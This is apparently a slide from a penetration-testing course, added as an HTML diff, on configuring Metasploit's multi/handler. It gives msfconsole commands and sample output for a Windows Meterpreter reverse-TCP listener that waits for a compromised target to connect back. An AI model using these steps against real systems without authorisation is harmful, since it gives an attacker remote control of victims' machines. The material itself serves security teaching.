@@ -1,0 +1,25 @@
+<div class="h-full w-full flex flex-col p-5 relative overflow-hidden cohortia-bg" data-theme="light"><div class="flex items-center gap-2 text-[10px] font-bold uppercase tracking-wider text-slate-500 mb-4"><span class="px-2 py-1 rounded-md bg-blue-50 text-blue-700 border border-blue-100">Module 4</span><span>›</span><span>Chapter 4.2</span><span>›</span><span class="text-slate-700">Configure Handler</span></div><div class="flex-grow flex items-center justify-center"><div class="grid grid-cols-2 gap-8 w-full h-full"><div class="flex flex-col justify-center p-6 bg-white rounded-2xl shadow-lg border border-slate-200"><div class="text-[10px] font-bold uppercase tracking-wider text-blue-700 mb-2">Metasploit Console</div><h2 class="text-3xl font-bold text-slate-900 mb-3 leading-tight">Configuring `multi/handler` in Metasploit</h2><p class="text-base text-slate-600 mb-6">Setting up your listener to receive incoming connections.</p><div class="space-y-4"><div class="flex items-start gap-3"><div class="flex-shrink-0 w-6 h-6 flex items-center justify-center rounded-full bg-blue-100 text-blue-700"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" class="w-4 h-4"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 10.5V6.75a4.5 4.5 0 119 0v3.75M3.75 21.75h10.5a2.25 2.25 0 002.25-2.25v-10.5a2.25 2.25 0 00-2.25-2.25H3.75A2.25 2.25 0 001.5 9v10.5a2.25 2.25 0 002.25 2.25z" /></svg></div><p class="text-sm text-slate-700 flex-grow"><strong>Load Module:</strong> Start `msfconsole` and use `use exploit/multi/handler`.</p></div><div class="flex items-start gap-3"><div class="flex-shrink-0 w-6 h-6 flex items-center justify-center rounded-full bg-blue-100 text-blue-700"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" class="w-4 h-4"><path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg></div><p class="text-sm text-slate-700 flex-grow"><strong>Configure:</strong> Set `PAYLOAD`, `LHOST`, and `LPORT` to match your `msfvenom` payload settings.</p></div><div class="flex items-start gap-3"><div class="flex-shrink-0 w-6 h-6 flex items-center justify-center rounded-full bg-blue-100 text-blue-700"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" class="w-4 h-4"><path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg></div><p class="text-sm text-slate-700 flex-grow"><strong>Verify & Start:</strong> Use `show options` to check, then `exploit` to start the listener.</p></div></div><div class="mt-6 rounded-xl border-l-4 border-l-emerald-500 bg-emerald-50 p-3"><div class="text-[10px] font-bold uppercase tracking-wider text-emerald-700 mb-1">Key Takeaway</div><p class="text-xs font-medium text-slate-800">A correctly configured `multi/handler` is essential for receiving connections and establishing control over a compromised system.</p></div></div><div class="flex flex-col justify-center bg-slate-800 rounded-2xl shadow-lg p-6 font-mono text-sm text-white overflow-auto"><div class="flex items-center gap-2 mb-4"><div class="w-3 h-3 rounded-full bg-red-500"></div><div class="w-3 h-3 rounded-full bg-yellow-500"></div><div class="w-3 h-3 rounded-full bg-green-500"></div><span class="ml-auto text-slate-400">kali@attacker:~</span></div><pre><code style="white-space: pre-wrap; tab-size: 2;"># Launch msfconsole
+user@kali:~$ msfconsole
+
+# Configure the handler
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST &lt;YOUR_KALI_IP&gt;
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > show options
+
+# Example output of show options (truncated)
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit method (Accepted: ...)
+   LHOST     &lt;YOUR_KALI_IP&gt;   yes       The listen address (an interface or IP address)
+   LPORT     4444             yes       The listen port
+
+msf6 exploit(multi/handler) > exploit</code></pre><div class="mt-4 p-3 bg-violet-700 rounded-lg"><div class="text-[10px] font-bold uppercase tracking-wider text-violet-100 mb-1">Important Note</div><p class="text-xs text-violet-200">The `exploit` command will start the listener, waiting for the target to connect back.</p></div></div></div></div><style>pre, code, [class*="code"], [class*="editor"], [class*="snippet"], [class*="source"] { white-space: pre-wrap; tab-size: 2; }</style></div>
